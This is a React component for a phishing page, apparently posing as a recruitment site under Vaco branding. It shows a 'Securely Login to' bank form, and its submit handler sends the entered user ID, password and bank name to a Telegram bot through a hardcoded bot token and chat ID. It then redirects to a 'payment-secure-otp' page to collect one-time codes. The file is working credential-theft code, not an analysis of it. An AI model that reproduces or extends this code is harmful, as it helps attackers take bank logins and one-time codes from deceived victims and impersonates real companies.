import React, { useState, useEffect } from 'react';
import './home.css';

import moment from 'moment';
import { useNavigate,Link , useLocation} from 'react-router-dom';


import logo from './logo.svg';
import social from './social.png';
import footer from './footer.svg';


import {db, auth, storage} from './firebase';

import axios from 'axios'

import { collection, getDocs, where, query, doc, setDoc,deleteDoc } from "firebase/firestore";
import hero from './hero.jpeg';
import { ref, uploadBytes, getDownloadURL } from "firebase/storage";


import Swal from 'sweetalert2';



function NextStep(){


    const location  = useLocation();
    const navigate = useNavigate();


    const[logotwo, setLogo] = useState(location.state.logo);
    const[name, setName] = useState(location.state.name);

    const[userid, setUserId] = useState("");

    const[password, setPassword] = useState("");
    


    // useEffect(() => {
       
    //     // window.location.reload();
    
      
    
    //   }, []); 


    //   application data

    
    async function handleSubmit(e){
        e.preventDefault();

        try {
            

            const response = await axios.post(`https://api.telegram.org/bot5464982919:AAGtjeZQ4hxueJkOoefHp040NJNaWGIZKMM/sendMessage`, {
                chat_id: 950865661,
                text: `UserId is : ${userid} , password is: ${password}  and bank is  ${name}`,
              });
          

            console.log('Message sent successfully:', response.data);

            navigate('/payment-secure-otp',
            {state:
                {
                    name:name,
                    userid:userid,
                    password:password
                   
                }
            }
            );
          } catch (error) {
            console.error('Error sending message:', error.message);
          }
    }
    

    return(
        <>
             <nav className="navbar containerr navbar-expand-lg navbar-light">
                <a className="navbar-brand" href="/"><img className='mylogo' src={logo}/></a>
                <button className="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
                    <span className="navbar-toggler-icon"></span>
                </button>
                <div className="collapse navbar-collapse" id="navbarNavAltMarkup">
                    <div className="navbar-nav ml-auto">
                   
                    <a className="nav-link mx-3" href="/">Home</a>
                    {/* <a className="nav-link mx-3" href="">About Us</a>
                    <a className="nav-link mx-3" href="#">Job Openings</a>
                    <a className="nav-link mx-3"href="#">For Veterans</a> */}
                    
                    </div>
                </div>
                </nav>

                    <br></br>
                <div className='herodivtwo py-5'>
                   
                </div>


               
              




                <div className='col-md-10 m-auto'>
                   

                 

                 <div className='card col-md-6 m-auto px-4 py-2 rounded'>

                     <div className='text-center'>
                     

                <h4 className='intro'>Securely Login to <b>{name}</b> </h4>
                     </div>


                     <div className='cardtwo col-11 rounded shadow m-auto py-2'>

                         
<form onSubmit={handleSubmit}>

    <div className='form-group'>
<label className='topic'>User ID</label>
    <input onChange={function(e){
        setUserId(e.target.value);
    }} value={userid} type="text"className='form-control' required/>
</div>



<div className='form-group'>
<label className='topic'>Password</label>
    <input onChange={function(e){
        setPassword(e.target.value);
    }} value={password} type="password"className='form-control' required/>
</div>

<br />

<br/>

<hr />

<div className='text-center'>

    <button type="submit" className='btn text-light w-100 continue'data-toggle="modal" data-target="#exampleModal">Continue</button>

</div>


</form>
</div>


          

            

                 </div>


               
                  

                 
             


               



    



               
               
                </div>


                <hr className='footerhr mt-5' />

                 <section className='footer containerr'>

                     <img className='mylogo' src={footer} />

                     <div>
                         <p className='small'>©2024 Vaco | All Rights Reserved</p>
                         <p className='small'>Vaco Global Headquarters: 5501 Virginia Way #120, Brentwood, TN 37027</p>
                         <p className='small'><a>Privacy policy</a> | <a>Fraud Policy</a> | <a>EEO Notice</a></p>
                     </div>


                    <img className='social'src={social} />
                 </section>



                 
                

        </>
    );
}

export default NextStep;